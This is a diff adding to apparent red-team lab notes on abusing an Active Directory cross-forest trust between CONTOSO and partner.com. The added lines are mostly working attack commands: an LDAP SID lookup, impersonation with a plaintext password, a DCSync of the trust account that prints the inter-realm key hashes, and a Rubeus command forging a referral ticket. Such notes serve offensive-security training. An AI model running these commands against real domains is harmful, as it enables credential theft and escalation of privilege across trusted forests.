@@ -29,4 +29,21 @@ ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hos
 Enumerate interesting SID
 ```powershell
 ldapsearch (objectSid=[SID])
+
+ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102)
+```
+
+Perform DCSync to obtain inter-realm key.
+```powershell
+make_token CONTOSO\dyork Passw0rd!
+dcsync contoso.com CONTOSO\PARTNER$
+rev2self
+
+7dd5eff4dfa069406ade61cbf61f1f0b39049781179d89c7cef0eb57200526a3
+77057e264522cbf4db45d6733b9167dc
+```
+
+Forge a refferal ticket offline
+```powershell
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:[NTLM HASH] /nowrap
 ```
